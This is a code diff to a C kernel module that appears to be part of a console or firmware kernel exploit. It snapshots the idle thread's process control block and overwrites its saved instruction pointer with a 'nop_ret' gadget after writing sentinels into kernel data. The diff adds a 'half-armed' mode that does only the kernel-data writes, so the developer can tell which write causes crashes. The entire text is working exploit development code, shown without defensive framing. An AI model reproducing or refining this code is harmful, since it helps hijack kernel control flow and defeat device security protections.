@@ -31,7 +31,10 @@
  * PHASES:
  *   fw_ver=0x403: Phase 1 — Snapshot idle PCB, overwrite pcb_rip, arm
  *   fw_ver=0x2:   Phase 2 — Verify post-resume: read PCB, check sentinels
- *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO overwrite (safe)
+ *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO writes at all (safe)
+ *   fw_ver=0x4:   Phase 1 HALF-ARMED — kdata writes only, NO pcb overwrite
+ *                 (diagnose: if this panics → kdata write issue;
+ *                            if this survives → PCB write is the problem)
  *
  * Output layout — Phase 1 (ARM):
  *   [0]   magic "PCBO" (0x5043424F) | status(32)
@@ -174,7 +177,7 @@ static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
     out32[1] = 0xAAAA;
     out[1] = kdata_base;
     out[2] = ktext_base;
-    out[3] = dry_run ? 3 : 1;
+    out[3] = dry_run == 1 ? 3 : dry_run == 2 ? 4 : 1;
 
     out[4] = pcpu0;
     out[5] = idlethread;
@@ -214,12 +217,10 @@ static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
     /* Record what we're about to do */
     out[20] = orig_rip;  /* BEFORE */
 
-    if (!dry_run) {
-        /* Backup original pcb_rip to kdata (for phase 2 comparison) */
+    if (dry_run == 0) {
+        /* ARMED: kdata writes + PCB overwrite */
         write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
         write8(kdata_base + KDATA_BACKUP_OFF + 8, nop_ret);
-
-        /* Write kdata sentinel to prove persistence */
         write8(kdata_base + KDATA_SENT_OFF, PCBO_SENTINEL);
 
         /* === THE OVERWRITE === */
@@ -231,8 +232,20 @@ static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
 
         out[24] = kdata_base + KDATA_SENT_OFF;
         out[25] = PCBO_SENTINEL;
+    } else if (dry_run == 2) {
+        /* HALF-ARMED: kdata writes only, NO PCB overwrite */
+        write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
+        write8(kdata_base + KDATA_BACKUP_OFF + 8, nop_ret);
+        write8(kdata_base + KDATA_SENT_OFF, PCBO_SENTINEL);
+
+        /* Report but don't touch PCB */
+        out[21] = orig_rip;  /* unchanged — PCB not written */
+        out[22] = nop_ret;   /* would-be target */
+
+        out[24] = kdata_base + KDATA_SENT_OFF;
+        out[25] = PCBO_SENTINEL;  /* sentinel WAS written to kdata */
     } else {
-        /* Dry run: don't touch anything, just report */
+        /* DRY RUN: no writes at all */
         out[21] = orig_rip;  /* unchanged */
         out[22] = nop_ret;   /* would-be target */
         out[24] = kdata_base + KDATA_SENT_OFF;
@@ -343,6 +356,8 @@ int module_start(kproc_args* args)
         phase1_arm(kdata_base, out, out32, 0);   /* ARM */
     } else if (mode == 0x3) {
         phase1_arm(kdata_base, out, out32, 1);   /* DRY RUN */
+    } else if (mode == 0x4) {
+        phase1_arm(kdata_base, out, out32, 2);   /* HALF-ARMED */
     } else if (mode == 0x2) {
         phase2_verify(kdata_base, out, out32);
     } else {
